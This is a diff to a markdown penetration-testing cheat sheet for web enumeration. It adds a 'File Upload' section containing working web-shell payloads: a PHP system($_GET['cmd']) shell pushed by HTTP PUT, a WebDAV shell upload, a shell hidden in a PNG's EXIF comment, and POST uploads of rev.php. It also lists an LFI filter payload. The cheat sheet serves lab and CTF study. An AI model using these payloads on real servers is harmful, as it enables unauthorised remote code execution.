@@ -15,20 +15,20 @@ Always ensure you have **explicit** permission to access any computer system **b
 ## Checklist
 
 * [ ] View SSL certificates for domains, emails, usernames
-* [ ] View Source code 
+* [ ] View source code 
 * [ ] Check `/robots.txt`, `.htaccess`, `.htpasswd`
 * [ ] Check HTTP Request/Response headers
 * [ ] Check for files/directories with `gobuster`/`dirbuster`
 * [ ] Check for virtual hosts/subdomains
-* [ ] View Console
+* [ ] View console
 * [ ] Use `nikto`
 * [ ] Check HTTP OPTIONS
 * [ ] HTTP PUT / POST File upload 
 * [ ] Parameter fuzzing with `ffuf`
-* [ ] Browser response vs Burp response
+* [ ] Browser vs. Burp response
 * [ ] Shell shock \(`cgi-bin/status`\)
 * [ ] Make wordlist with `cewl` and directory/login brute force
-* [ ] `nmap --script http-enum 192.168.10.55`
+* [ ] `nmap --script http-enum 10.10.10.10`
 * [ ] Apache version exploit & other base server exploits
 
 ## HTTP Response Codes
@@ -282,6 +282,38 @@ Common and/or useful files to check for when exploiting Local File Inclusion \(f
 https://example.com/index.php?page=php://filter/convert.base64-encode/resource=index.php
 ```
 
+## File Upload
+
+**HTTP PUT**
+
+```bash
+nmap -p 80 $ip --script http-put --script-args http-put.url='/home/zweilos/php-reverse-shell.php',http-put.file='rev.php'​
+curl -X PUT -d '<?php system($_GET["cmd"]);?>' http://$ip/rev.php
+```
+
+**Cadaver**
+
+```text
+cadaver http://10.10.10.10/dav/put /tmp/shell.php
+```
+
+**JPG to PNG shell**
+
+```php
+<?php system($_GET['cmd']); ?>  //rev.php
+exiftool "-comment<=rev.php" malicious.png
+```
+
+**Upload Files through POST**
+
+```bash
+# POST file
+curl -X POST -F "file=@/file/location/rev.php" http://$ip/upload.php --cookie "cookie"​
+
+# POST binary data to web form
+curl -F "field=<rev.zip" http://$ip/upload.php -F 'k=v' --cookie "k=v;" -F "submit=true" -L -v
+```
+
 ## OpenVAS Vulnerability Scanner
 
 ```bash
@@ -332,8 +364,6 @@ Wordpress enumeration: `wpscan -u <url> [--disable-tls-checks]`
 pull Google cached webpage if regular site not loading: `cache:https://<somewebsite>`
 
 Virtual Host Routing: substitute IP for hostname to get different results
-
-### 
 
 hydra against http wordpress login walkthrough: [IppSec:HacktheBox - Apocalyst](https://www.youtube.com/watch?v=TJVghYBByIA)
 
